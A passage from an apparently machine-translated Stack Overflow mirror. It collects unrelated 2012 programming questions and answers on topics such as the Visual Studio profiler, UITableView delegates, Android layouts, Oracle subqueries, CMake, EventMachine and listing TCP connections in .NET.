使用更少的代码，使用 [sys.dm_exec_describe_first_result_set](https://docs.microsoft.com/en-us/sql/relational-databases/system-dynamic-management-views/sys-dm-exec-describe-first-result-set-transact-sql?view=sql-server-ver15)您可以执行以下操作：

```
SELECT * FROM sys.dm_exec_describe_first_result_set  (N'DECLARE @TEST myTableType ; SELECT * FROM @TEST', null, 0) ; 
```

以下是一些列：

[![在此处输入图像描述](../Images/4f7223d484400d1cd88923e84daf4e53.png)](https://i.stack.imgur.com/jbecW.png)

# visual-studio-2010 - 如何使用 Microsoft Visual Studio 2010 Performance Profiler 摆脱“PRF0002: Instrumentation failed with these options”错误？

> ID：13806398
> 
> 赞同：15
> 
> 时间：2012-12-10T17:53:36.547
> 
> 标签：visual-studio-2010, profiler

我现在使用 Microsoft Visual Studio 2010 Performance Profiler 来分析一个程序。当我使用 CPU 采样方法时效果很好。但是，当我使用 Instrumentation 方法时，我收到以下错误消息：

```
PRF0002: Instrumentation failed with these options: /u "my program" /excludesmallfuns. Please check the output window for additional details. 
```

我想知道如何摆脱这个错误。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-02-06T19:47:55.743

1.  为您将要分析的可执行文件和 .dll 打开分析（请参阅[有关 /PROFILE 链接器选项的 Microsoft 文档](https://docs.microsoft.com/en-us/cpp/build/reference/profile-performance-tools-profiler?redirectedfrom=MSDN&view=vs-2019)）

2.  从 Performance profiler > Settings > Additional Instrumentation options - 添加多个`/include:<function name>`or `/include:<class name>::<function name>`，其中函数名称可以用`*`星号替换。由于某种原因，按下`'Ok'`对我不起作用 - 需要先按下`'Apply'`，然后才能使用设置。（使用 Visual Studio 2019、16.4.3）使用`/verbose`可用于解决检测问题。可以在此处找到完整的选项列表：[VSInstr 上的 Microsoft 文档](https://docs.microsoft.com/en-us/visualstudio/profiling/vsinstr?view=vs-2017)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-23T11:58:18.797

我遇到了类似的情况，为我解决的问题是删除了我在 IIS (express) 中添加到我的网站的所有额外绑定。因此，如果您的情况允许这种方法，那么：

1.  打开 IIS 管理器
2.  在连接窗格中，展开“站点”
3.  右键单击您的网站（或默认网站）
4.  选择“编辑绑定”
5.  选择端口 80 的默认绑定以外的所有绑定
6.  单击“删除”并关闭弹出窗口。
7.  我还重新启动了 IIS。

重新启动 Visual Studio，希望你的分析器这次能正常工作！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-16T07:39:44.297

我面临着同样的问题。事实证明，您必须为要分析的部分打开链接器配置文件开关。您可以这样做： [打开 profiling](https://msdn.microsoft.com/en-us/library/ays5x7b0.aspx)。但是，在我的情况下，我已经构建了我的可执行文件和所需的 dll 并进行了分析，这就造成了问题。一旦我为我的可执行文件关闭了分析标志，我就能够使用这种方法对其进行分析：
[分析特定的 dlls msdn](https://msdn.microsoft.com/en-us/library/bb385752.aspx)

# c++ - 基准测试：获取算法用户时间

> ID：13806402
> 
> 赞同：1
> 
> 时间：2012-12-10T17:53:51.700
> 
> 标签：c++, performance, benchmarking

我正在尝试测试我用 C++ 编写的算法的性能。我使用我的大学计算集群（通过 SGE）

问题是我不知道服务器何时已满或没有其他计算，因此我无法测量有效的用户时间（我假设只要进程如此繁忙，它就不会改变，我我错了？）

用户时间不是用来计算和比较算法之间时间性能的时间吗？因为对于相同的执行，我没有得到相同的结果

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:02:25.960

如果您是分时共享，则算法的运行时间会因运行而异。

你试过shell`time`命令吗？

```
time [MY PROGRAM] 
```

或者，为了获得更多信息，[GNU Time](http://linux.die.net/man/1/time)命令？

```
/usr/bin/time <MY PROGRAM> [ARGS] 
```

这些命令将是一个容易开始的地方，并将为您提供一些您需要的信息。

另外，您提到了一个集群，也许您正在使用 MPI 或其他框架？也许这个框架有一些内置的计时命令（我不确定这些东西是否存在，但它可能值得研究）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:01:28.987

为了比较性能指标，您确实希望消除“用户时间”这一噪音。那里有很多很好的[分析工具](https://stackoverflow.com/q/26663/46821)。您可以查看您的大学是否有其中之一可供您使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:03:06.417

您可以编写小标准测试。该测试将代表“1”。然后您的复杂应用程序将被相对测量。例如，您的应用程序将进行 4 次标准测试。您需要同时运行标准测试和应用程序。

# objective-c - UITableView visibleCell - 将使用 tableView:cellForIndexPath 重新创建 non-visibleCell：

> ID：13806405
> 
> 赞同：0
> 
> 时间：2012-12-10T17:53:53.437
> 
> 标签：objective-c, ios, uitableview

**背景**

我有一个名为 _tableView 的带有 UITableView ivar 的类。该类实现了 UITableViewDatasource 和 UITableViewDelegate _tableView。UITableView 单元格是 FormTableCell 的实例。FormTableCell 是 UITableViewCell 的子类，具有 UILabel 和 UITextField。在课堂上，我有一个名为 textFieldDelegate 的属性。当 tableView:cellForIndexPath: 被调用时，当前的 textFieldDelegate 被分配给返回单元格的 textField 属性。此外，当类 textFieldDelegate 被修改时，我想更新单元格文本字段的委托。我想出了三种方法来做到这一点，但不知道最好的方法。

1.  使用新的 textFieldDelegate 更新每个可见单元格的委托。
2.  遍历所有单元格并分配新的 textFieldDelegate
3.  重新加载 tableViews 数据。

选项 1 很好，但它假定 tableView:cellForIndexPath 将在显示不在 tableView 的 visibleCells 数组中的任何单元格之前被调用。如果这没有发生，那么不同的单元格可能有不同的代表，这不是我想要的。

选项 2 是最差的，因为它只适用于少量单元格，我希望 FormTables 总是有少量单元格，但我永远不知道。

如果我假设 tableView:cellForIndexPath: 在显示不可见单元格之前将被调用是无效的并且它胜过选项 2，因为它处理具有大量单元格的表格，则选项 3 胜过选项 1。

**问题**

哪个是最好的选择，我假设 tableView:cellForIndexPath: 将在不可见的单元格变得可见或与不正确的交互之前被调用？

**代码**

```
- (void)setTextFieldDelegate:(id<UITextFieldDelegate>)textFieldDelegate
{
  if(_textFieldDelegate != textFieldDelegate) {
    _textFieldDelegate = textFieldDelegate;

    //Update _textFieldDelegate for all visible cells. 
    //!DEV: Assuming non-visible cells will be recreated with tableView:cellForIndexPath:
    for (FormTableCell *cell in [_tableView visibleCells]) {
      [[cell textField] setDelegate:_textFieldDelegate];
    }

    //!DEV: This will potentially generate memory issues for a large number of cells
    for(NSUInteger i = 0; i < kNumberOfFields; ++i) {
      NSIndexPath *indexPath = [NSIndexPath indexPathForItem:(NSInteger)i inSection:0];
      FormTableCell *cell = (FormTableCell*)[_tableView cellForRowAtIndexPath:indexPath];
      [[cell textField] setDelegate:_textFieldDelegate];
    }

    //!DEV: Maybe this is the best method, but it requires the recreation of visibleCells.
    [_tableView reloadData];

  }
} 
```

**最终状态**

所以这就是我最终做的。我实现了一个装饰委托（？）

```
- (void)setTextFieldDelegate:(id<UITextFieldDelegate>)textFieldDelegate
{
  if(_textFieldDelegate != textFieldDelegate) {
    _textFieldDelegate = textFieldDelegate;
  }
}

#pragma mark - UITextFieldDelegate Implementation

//This class forwards UITextFieldDelegate methods on to _textFieldDelegate, if implemented.
//Provides default functionality is not implemented.

- (BOOL)textFieldShouldBeginEditing:(UITextField *)textField
{
  if([_textFieldDelegate respondsToSelector:@selector(textFieldShouldBeginEditing:)]) {
    return [_textFieldDelegate textFieldShouldBeginEditing:textField];
  } //implicit else
  return YES;
}
- (void)textFieldDidBeginEditing:(UITextField *)textField {

  //Setup _closeKeyboardButton behind _tableView
  //view::closeKeyboardButton (_closeKeyboardButton)
  NSAssert(_closeKeyboardButton == nil, @"!DEV: Thought _closeKeyboardButton would always be nil here.");
  if(_closeKeyboardButton != nil) {
    [_closeKeyboardButton removeFromSuperview];
    _closeKeyboardButton == nil;
  }

  CGRect closeKeyboardFrame = {CGPointZero, [self frame].size};

  UIButton *closeKeyboardButton = [UIButton buttonWithType:UIButtonTypeCustom];
  [closeKeyboardButton setFrame:closeKeyboardFrame];

  [closeKeyboardButton addTarget:self
                          action:@selector(_closeKeyboardButtonTapped:)
                forControlEvents:UIControlEventTouchUpInside];

  [self insertSubview:closeKeyboardButton belowSubview:_tableView];
  _closeKeyboardButton = closeKeyboardButton;

  if([_textFieldDelegate respondsToSelector:@selector(textFieldDidBeginEditing:)]) {
    [_textFieldDelegate textFieldDidBeginEditing:textField];
  }
}

- (BOOL)textFieldShouldEndEditing:(UITextField *)textField
{
  if([_textFieldDelegate respondsToSelector:@selector(textFieldShouldEndEditing:)]) {
    return [_textFieldDelegate textFieldShouldEndEditing:textField];
  } //implicit else
  return YES;
}

- (void)textFieldDidEndEditing:(UITextField *)textField
{
  if([_textFieldDelegate respondsToSelector:@selector(textFieldDidBeginEditing:)]) {
    [_textFieldDelegate textFieldDidBeginEditing:textField];
  }

  //Tear down _closeKeyboardButton
  NSAssert(_closeKeyboardButton != nil, @"!DEV: Thought _closeKeyboardButton would always exist here.");
  [_closeKeyboardButton removeFromSuperview];
  _closeKeyboardButton = nil;
}

- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string
{
  if([_textFieldDelegate respondsToSelector:@selector(textField:shouldChangeCharactersInRange:replacementString:)]) {
    return [_textFieldDelegate textField:textField shouldChangeCharactersInRange:range replacementString:string];
  } //implicit else
  return YES;
}

- (BOOL)textFieldShouldClear:(UITextField *)textField
{
  if([_textFieldDelegate respondsToSelector:@selector(textFieldShouldClear:)]) {
    return [_textFieldDelegate textFieldShouldClear:textField];
  } //implicit else
  return YES;
}

- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
  if([_textFieldDelegate respondsToSelector:@selector(textFieldShouldReturn:)]) {
    return [_textFieldDelegate textFieldShouldReturn:textField];
  } //implicit else
  return NO;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:37:01.547

根据我的经验，永远不需要访问 tableView 的 visibleCells 属性。

在您的 tableView:cellForRowAtIndexPath: 方法中完成所有操作。每次创建单元格时都会调用它，或者从对 dequeReusableCell 的调用中提取回收的单元格......该方法将在任何可见单元格出现在屏幕上之前被调用。

出于教育目的，您可以在所有 tableview 方法中添加一些 NSLog，以查看它们被调用的确切顺序，以及哪些操作导致它们被调用。

无关说明——如果您需要对单元格中的子视图进行任何帧操作，您可以覆盖 FormTableCell 中的 layoutSubviews 方法，或者您可以实现 tableView:willDisplayCell:forRowAtIndexPath: 方法并在那里执行。

# android - TableLayout 高度中的 TextView

> ID：13806406
> 
> 赞同：0
> 
> 时间：2012-12-10T17:53:58.453
> 
> 标签：android, android-layout

我使用`TableLayou`t 来对齐控件及其标签。style/rounded_label 和 style/rounded_value 的高度和宽度都是`wrap_content`.

```
<item name="android:layout_width">wrap_content</item>
<item name="android:layout_height">wrap_content</item> 
```

当 TextView 将其文本拆分为两行时，TableRow 的高度不会改变。 ![左多行](../Images/64c7b134126b5081dc7185036e6c3575.png)

但是当 EditText 有多行时， TableRow 会包装它。 ![右多线](../Images/f569bbc76fb96bd65f1bd12feec810ed.png)

当 TextEdit 多行时，我需要 TableRow 来换行文本。

（我试过收缩列）

布局xml是：

```
<TableLayout
            android:id="@+id/frmPaymentTableLayout"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content">

<TableRow
                android:id="@+id/frmPaymentTrSerialCreditCardNo"
                style="@style/rounded_row" >

                <TextView
                    android:id="@+id/frmPaymentTvSerialCreditCardNo"
                    style="@style/rounded_label"
                    android:text="Card Nr" />

                <View style="@style/rounded_seperator" >
                </View>

                <EditText
                    android:id="@+id/frmPaymentEtSerialCreditCardNo"
                    style="@style/rounded_value"
                    android:ems="10" >

                    <requestFocus />
                </EditText>
            </TableRow> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:02:27.647

`TableLayout`处理其子项的所有宽度和高度。事实上，你甚至不能`layout_width`为它的孩子定义。这可能是您的问题的原因。

尝试从您的视图中删除`layout_height`和。`layout_width`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:19:21.393

您需要`android:layout_height="wrap_content"`在您的项目内添加，它会根据其孩子的大小`TableRow`适合大小。`TableRow`

我认为你错过了实现的重点......我认为你需要重新设计你的 xml ......

```
<TableLayout
                android:id="@+id/frmPaymentTableLayout"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content">

    <TableRow
                    android:id="@+id/frmPaymentTrSerialCreditCardNo"
                    android:layout_height="wrap_content"
                    style="@style/rounded_row" >

                    <TextView
                        android:id="@+id/frmPaymentTvSerialCreditCardNo"
                        style="@style/rounded_label"
                        android:text="Card Nr" />

                    <View style="@style/rounded_seperator" >
                    </View>

                    <EditText
                        android:id="@+id/frmPaymentEtSerialCreditCardNo"
                        style="@style/rounded_value"
                        android:ems="10" >

                        <requestFocus />
                    </EditText>
                </TableRow> 
```

# java - 日历阅读挂起我的 android 应用程序

> ID：13806409
> 
> 赞同：0
> 
> 时间：2012-12-10T17:54:05.510
> 
> 标签：java, android, calendar

**为什么这个代码：**

```
Calendar c = Calendar.getInstance();
SimpleDateFormat formatter = new SimpleDateFormat("yyyy/mm/dd HH:mm");
String dateNow = formatter.format(c.getTime()); 
```

挂起我的android应用程序？

会是使用错误吗？为什么会这样？

# c++ - 运算符重载错误 C++

> ID：13806412
> 
> 赞同：0
> 
> 时间：2012-12-10T17:54:16.813
> 
> 标签：c++

我在 cpp 文件中有一个内联运算符重载。我的理解是内联函数也应该和函数体一起放在头文件中。

但是当我这样做时。出现的错误是“operator ==”的重新定义

你能解释一下为什么会出现这样的错误。另外，谁能解释一下头文件中应该保留什么样的内容。？

```
inline bool operator ==(Duration& d1, Duration& d2)
{

   return d1.getSecond() == d2.getSecond();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T17:56:32.843

你不能定义一个函数两次。在标题中声明它并在 cpp 中定义它 - 或者 - 只需在标题中定义它并将其完全排除在 cpp 之外。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:56:54.727

内联函数需要放在标题中，而不是源中。否则，它们在您尝试调用它们的其他来源中将不可用。

在源代码中有第二个副本确实是重复的。

# basic-authentication - 基本身份验证在本地工作，但不在 Travis 上

> ID：13806425
> 
> 赞同：1
> 
> 时间：2012-12-10T17:55:19.067
> 
> 标签：basic-authentication, behat, travis-ci, goutte, guzzle

为了使用我的 API，我需要经过身份验证才能执行一些操作。我正在使用 Behat + Mink 进行测试。

我有两种身份验证方法：通过令牌（发送带有一些参数的 POST 请求，然后获取我可以在其他地方使用的令牌），这在本地环境和 Travis 环境中运行良好，或者我可以使用基本身份验证。

在我的本地环境中，Basic Auth 工作得非常好，而且我不记得配置过什么特别的东西......但是当我在 Travis 上执行测试时，它似乎没有考虑到它。

正如我所说，我正在使用 Behat + Mink（+ Goutte，所以我也在使用 Guzzle），并且在将请求发送到 Curl 之后，似乎包含 Authorization ( `Authorization: Basic (base64_txt)`) 的标头只是......消失了。即使我在本地环境中。但是，它仍然保留了我的登录信息。但不是在 Travis 环境中，它与我的本地环境应该没有什么不同......

[这是要点链接。](https://gist.github.com/843e9f424656e0b114f6)

我不知道是否有足够的信息，但如果您需要更多信息，请随时告诉我，我会尽可能提供。

谢谢。

# sql - 根据司机身份显示工资高于司机平均工资的司机

> ID：13806427
> 
> 赞同：0
> 
> 时间：2012-12-10T17:55:28.810
> 
> 标签：sql, oracle

我应该让司机的工资高于按他们的状态排序的所有司机的平均工资。使用我编写的代码，我无法通过子查询使用“Order by”函数。显示将是司机姓名、司机身份和他们的薪水。这是我的代码

```
dr_status = the driver status
dr_drvname = driver name
dr_salary = driver salary
driver = driver table

select dr_drvname,dr_drvstatus,dr_salary
from driver
where dr_salary > (select avg(dr_salary) from driver group by dr_drvstatus)
group by dr_drvstatus; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:08:58.600

我很确定你可以做这样的事情。

```
select dr_drvname,dr_drvstatus,dr_salary
from driver d1
where dr_salary > (
    select avg(dr_salary) from driver d2
    where d2.dr_drvstatus = d1.dr_drvstatus
)
group by dr_drvstatus; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T00:06:09.697

不使用 OLAP 函数并避免相关子查询，我可能会写：

```
SELECT d.dr_drvname, d.dr_drvstatus, d.dr_salary
  FROM driver AS d
  JOIN (SELECT d2.dr_drvstatus, AVG(d2.dr_salary) AS avg_salary
          FROM driver AS d2
         GROUP BY d2.dr_drvstatus
       ) AS a ON d.dr_drvstatus = a.dr_drvstatus
 WHERE d.dr_salary < a.avg_salary; 
```

子查询将只执行一次以生成状态列表和该状态的平均工资。如果编写为相关子查询（如[jonhopkins](https://stackoverflow.com/users/1053938/jonhopkins)的[回答](https://stackoverflow.com/a/13806634/15168)），您将面临优化器未发现子查询可以转换为非相关子查询的风险。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:03:31.000

当您使用像 AVG() 这样的聚合函数时，您几乎不需要或希望该子查询具有“order by”或“group by”子句。它必须返回单个值以用于比较...您希望单个值的顺序是什么？它应该比较哪一个分组值？你让选择变得疯狂。;-)

尝试删除该位并查看...将子选择砍成这样：

`(select avg(dr_salary) from driver)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:06:19.440

我想你想要这样的东西？

```
select dr_drvname,dr_drvstatus,dr_salary, avg_sal
  from (select dr_drvname,dr_drvstatus,dr_salary, 
               avg(salary) over (partition by dr_drvstatus) avg_sal
          from driver)
 where dr_salary > avg_sal; 
```

# cmake - 基于执行另一个目标的结果的目标的 cmake 链接库

> ID：13806430
> 
> 赞同：0
> 
> 时间：2012-12-10T17:55:33.397
> 
> 标签：cmake

我正在尝试使用从运行目标生成的文件的内容来定义一些将链接到另一个目标的库。

这将是这样的：

```
add_executable(generator zoot.cpp)

get_property(GEN_LOCATION TARGET generator PROPERTY LOCATION)

add_custom_command(OUTPUT libInfo.txt
                   COMMAND ${GEN_LOCATION}
                   DEPENDS someOtherFile.txt)

add_custom_target(lib_info_generator ALL
                  DEPENDS libInfo.txt someOtherFile.txt)

add_dependencies(lib_info_generator generator)

add_executable(final_target hi.cpp)

file(STRINGS "libInfo.txt" MY_LIB)

if(MY_LIB STREQUAL "lib1")
  target_link_libraries(final_target lib1)
else()
  target_link_libraries(final_target lib2)
endif() 
```

这不起作用，因为 libInfo.txt 在目标 lib_info_generator 执行之前不会存在。

有没有办法在 CMake 中实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T10:26:52.773

我对 CMake 很陌生，我只是在猜测，但是您可以尝试通过设置来强制构建顺序

```
add_dependencies(final_target lib_info_generator) 
```

@Alexey：根据自定义命令的 CMake 文档输出自动获取属性 GENERATED 集。所以这不会改变情况。

# ruby - 使用 EventMachine 消费表

> ID：13806433
> 
> 赞同：0
> 
> 时间：2012-12-10T17:56:27.883
> 
> 标签：ruby, eventmachine

我的 Ruby 项目中有一个模型**Resend**，它包含内容和状态列。

使用 EventMachine 使用状态为 0 的所有记录的最佳/最快方法是什么？

我想创建一个简单的工作人员，尝试在每个时期（比如每 5 分钟）查找 status==0 的记录

我还是 EventMachine 的新手，找不到太多如何处理 DB 的例子。

到目前为止，我做了如下的事情，但不确定它是否是最好的实现：

```
$ROOT_PATH ||= File.expand_path("#{File.dirname __FILE__}")

require "rubygems"
require 'eventmachine'
require 'em-http'

require "#{$ROOT_PATH}/app/models/resend.rb"

EventMachine.run do
  EM.add_periodic_timer(5) do
    Resend.active.each do |msg|
        http = EventMachine::HttpRequest.new($RECEIVER_URL).post :body => {:message => msg.content }
        http.callback { msg.update_status! }
    end
  end
end 
```

任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T04:09:00.410

You need evented version of your DB gem. They usually have prefix em- . If it's a mongoDB there is 'em-mongo' gem. For Mysql the best option I heard is built-in async module in mysql2 gem

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T19:19:46.967

这种方法的问题是您将触发对该范围内的*每个*Resend 的调用，并且您将每五秒执行一次。至少您需要将这些记录标记为正在处理，这样您就不会重复工作。如果处理其中任何一个需要超过 5 秒，您将有重叠的调用。

您真正需要的是某种作业队列，例如[beanstalkd](http://kr.github.com/beanstalkd/)或[delayed_job](https://github.com/tobi/delayed_job)。

# c# - 如何使用 .NET Framework 获取所有活动的 TCP 连接（没有非托管 PE 导入！）？

> ID：13806435
> 
> 赞同：13
> 
> 时间：2012-12-10T17:56:38.683
> 
> 标签：c#, .net, sockets

如何使用 .NET Framework 获取所有活动的 TCP 连接（没有非托管 PE 导入！）？

我正在进入套接字编程并想检查一下。在我的研究中，我通过导入一个我不感兴趣的非托管 DLL 文件找到了解决方案。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-12-10T19:16:09.983

我对告诉我纯托管代码无法实现的用户数量感到惊讶......对于想知道这一点的未来用户，请从对我来说很好的答案中找到详细信息：

```
//Don't forget this:
using System.Net.NetworkInformation;

public static void ShowActiveTcpConnections()
{
    Console.WriteLine("Active TCP Connections");
    IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
    TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
    foreach (TcpConnectionInformation c in connections)
    {
        Console.WriteLine("{0} <==> {1}",
                          c.LocalEndPoint.ToString(),
                          c.RemoteEndPoint.ToString());
    }
} 
```

并调用`ShowActiveTcpConnections()`列出它，真棒和美丽。

来源：*[IPGlobalProperties.GetActiveTcpConnections 方法](http://msdn.microsoft.com/en-us/library/system.net.networkinformation.ipglobalproperties.getactivetcpconnections.aspx)*(MSDN)

# android - 如何在 Android 中跟踪特定用户随时间推移的事件实例

> ID：13806439
> 
> 赞同：1
> 
> 时间：2012-12-10T17:56:48.993
> 
> 标签：android, google-analytics, analytics

我正在尝试跟踪 Android 中特定用户随时间推移发生的每个事件实例（按钮单击）的发生情况。我创建了一个小部件，并通过添加一个活动用户类型的额外过滤器，将目标完成作为时间轴上的参数。

但是，它仅显示特定事件的实例数，而不是发生时间。而且我对在活动用户类型过滤器中传递哪些参数感到模糊？它只是指定新的/返回的，都尝试了但无济于事。

如果你能给我一些关于他的建议，我将不胜感激

苏吉特

# firefox-addon - 为什么我的简单 firefox 插件运行 3 次

> ID：13806442
> 
> 赞同：0
> 
> 时间：2012-12-10T17:56:55.810
> 
> 标签：firefox-addon

我的 main.js

```
var pageMod = require("page-mod");
pageMod.PageMod({
    include: "http://www.example.com/item/*",
    onAttach: function(worker) {
        var item_id = 19367407;
        console.log(item_id );
    }
}); 
```

我的控制台输出是：

```
info: ff: 19367407
----------
info: ff: 19367407
----------
info: ff: 19367407 
```

为什么我得到它3次？是否有 3 名工人在运行，为什么？

**更新**：我刚刚发现“包含”页面上的谷歌广告是问题所在！我对它们进行了广告屏蔽，另外 2 个信息消失了！我怎样才能让它在没有这个问题的情况下运行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:23:24.720

```
pageMod.PageMod({
    attachTo: ["top"] 
```

# asp.net-mvc - 如何使用全局配置对 MVC/WebAPI 进行单元测试

> ID：13806452
> 
> 赞同：4
> 
> 时间：2012-12-10T17:57:26.487
> 
> 标签：asp.net-mvc, unit-testing, asp.net-web-api

我想对我的控制器进行单元测试，但是在我的 Global.asax.cs 文件中，我必须注册诸如 JSON 格式化程序、自定义标头和 AutoMapper 映射之类的东西。由于 VS 单元测试功能是通过 DLL 而不是 API 测试控制器，因此没有创建 HttpApplication 并且我的很多代码都无法测试。我怎样才能解决这个问题？

测试 JsonFormatter 输出的最简单方法是什么，因为它实际上不是控制器的一部分，但也可能是异常的来源？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-24T14:34:19.093

我遇到过同样的问题。对于 autoMaopper，我运行了 MapperConfig.Initialize(); 在我的单元测试的设置方法中（我使用 NUnit）

我也叫“WebApiConfig.Register(GlobalConfiguration.Configuration);” 在我的设置方法中，但在我的控制器中对 Configuration.Services.GetTraceWriter() 的调用返回时出现空引用异常。所以我还帮不上那个忙。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:10:31.403

为了对控制器进行单元测试，我只需在我的测试套件中引用 API DLL 并直接执行这些方法。

为了进行更多的集成测试，确保您的路由和映射按预期工作，我在我的测试类中为 WebApi 创建了一个 HttpClient，并查看响应。
以下文章很好地概述了如何从 .NET 客户端调用 webApi 函数： [http ://www.asp.net/web-api/overview/web-api-clients/calling-a-web-api-from -a-net-client](http://www.asp.net/web-api/overview/web-api-clients/calling-a-web-api-from-a-net-client)

# scala - 简单的远程参与者/服务器：本地客户端不会停止

> ID：13806453
> 
> 赞同：1
> 
> 时间：2012-12-10T17:57:29.943
> 
> 标签：scala, actor, remote-actors

开始使用 scala 并且非常喜欢这种语言，但我似乎很难理解演员是如何工作的。我以前使用 NIO 做了很多远程工作，但现在我想尝试 scala 的远程演员。

我正在尝试创建一个非常简单的服务器和客户端（参见下面的代码）。

1.  服务器已启动
2.  制作了一个远程演员代理（按照这个例子：[http](http://www.scala-lang.org/docu/files/actors-api/actors_api_guide_6.html) ://www.scala-lang.org/docu/files/actors-api/actors_api_guide_6.html ）
3.  我通过代理向服务器发送一条消息，它通过了
4.  我想关闭我的应用程序......但是怎么做！？:)。它永远持续下去

代码：

```
package testactors

import scala.collection.mutable.ArrayBuffer
import scala.actors._
import scala.actors.Actor._
import scala.actors.remote._
import scala.actors.remote.RemoteActor._

class Server extends Actor {
    start

    @volatile private var toLive = true

    def act() {

        alive(9000)
        register('server, self)

        while (toLive) {
            receiveWithin(100) {
                case TIMEOUT =>
                case e => println(e)
            }
        }

        println("Server died")
    }

    def killActor() {
        toLive = false
    }

}

object Main {

    def main(args: Array[String]): Unit = {

        val remoteSrc = new Server

        println("Connecting to remote actor")
        var localSrc = select(Node("localhost", 9000), 'server)
        localSrc ! "hello"
        Thread.sleep(1000)

        println("Killing remote actor")
        remoteSrc.killActor

    }

} 
```

输出是：

```
Connecting to remote actor
hello
Killing remote actor
Server died 
```

但它会一直持续下去。。

更新

对不起！重复，第三次搜索找到答案： [向演员发送来自非演员的消息是不好的做法吗？](https://stackoverflow.com/questions/1058408/is-it-bad-practice-to-send-an-actor-a-message-from-something-which-is-not-an-act)

# iphone - 无法检测运行动作的精灵的确切位置

> ID：13806455
> 
> 赞同：0
> 
> 时间：2012-12-10T17:57:37.587
> 
> 标签：iphone, objective-c, ios, cocos2d-iphone

我需要做以下事情：一个精灵被移动到一个位置，当精灵移动到这个位置时，我需要执行相反的动作。
为了在这个例子中进行测试，当我到达那个位置时，我只打印“ok”，避免过度释放动作并冒一些异常的风险。

```
-(id) init
{
    if( (self=[super init]))
    {
        soldier=[CCSprite spriteWithFile: @"soldier.gif"];
        soldier.position= CGPointMake(250, 250);
        [self addChild: soldier];
        CGPoint position=[soldier convertToNodeSpace: CGPointZero];
        CCMoveTo* move=[CCMoveBy actionWithDuration: 2 position: position];
        [move retain];
        [soldier addObserver: self forKeyPath: @"position" options: NSKeyValueObservingOptionNew context: (void*)move];
        [soldier runAction: move];
    }
    return self;
}

- (void) observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context
{
    CGPoint position= [self convertToNodeSpace: soldier.position];
    if(CGPointEqualToPoint(position, CGPointZero));
    {
        NSLog(@"ok");
    }
} 
```

问题是它打印了很多次“ok”，它应该只打印一次，为什么？

**编辑**

我删除了多余的 ';' ：

```
- (void) observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context
{
    CGPoint position= [self convertToNodeSpace: soldier.position]; // breakpoint here
    if(CGPointEqualToPoint(position, CGPointZero))
    {
        NSLog(@"ok");
    }
} 
```

现在它永远不会打印“ok”。在断点中我打印位置，最后一个值为（47,47），它永远不会达到（0,0）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:34:58.143

删除方法中 if 语句第一行后面的分号`-observeValueForKeyPath:ofObject:change:context:`。因此，该`NSLog`函数被无条件地调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T11:18:56.430

我不会将 KVO/KVC 与 cocos2d 一起使用，原因很简单，因为 cocos2d 不兼容 KVC/KVO。Cocos2D 类的属性可能会在您没有收到通知的情况下发生更改。

我不知道这是否是这里的问题，但如果你继续使用 KVC/KVO，你最终会遇到问题。

# jpa-2.0 - Weblogic 10.3.3 尝试加载 org.eclipse.persistence.jpa.PersistenceProvider 而不是配置的 Hibernate Provider

> ID：13806457
> 
> 赞同：3
> 
> 时间：2012-12-10T17:57:48.677
> 
> 标签：jpa-2.0, spring-roo, weblogic-10.x

大家好，

自从很多天以来我都遇到了这个问题，我能够在 weblogic 10.3.3 上成功部署 JPA2.0 应用程序，该应用程序可以使用 JPA 运行选择查询。但是，当我尝试在同一张表上运行创建或更新信息时，我得到以下异常 [代码]

```
java.lang.ClassCastException: org.eclipse.persistence.jpa.PersistenceProvider cannot be cast to javax.persistence.spi.PersistenceProvider 
```

[/代码]

这很奇怪，因为在我的 persistence.xml 中，我提供了 hibernate 作为 JPA 提供程序，定义的持久性单元如下 [code]

```
<persistence-unit name="persistenceUnit" transaction-type="RESOURCE_LOCAL">
        <provider>org.hibernate.ejb.HibernatePersistence</provider>
        <properties>
            <!-- 

            <property name="hibernate.dialect" value="org.hibernate.dialect.Oracle10gDialect"/>
             -->
            <property name="hibernate.dialect" value="org.hibernate.dialect.OracleDialect"/>

            <!-- value="create" to build a new database on each run; value="update" to modify an existing database; value="create-drop" means the same as "create" but also drops tables when Hibernate closes; value="validate" makes no changes to the database -->
            <property name="hibernate.hbm2ddl.auto" value="validate"/>
            <property name="hibernate.ejb.naming_strategy" value="org.hibernate.cfg.ImprovedNamingStrategy"/>
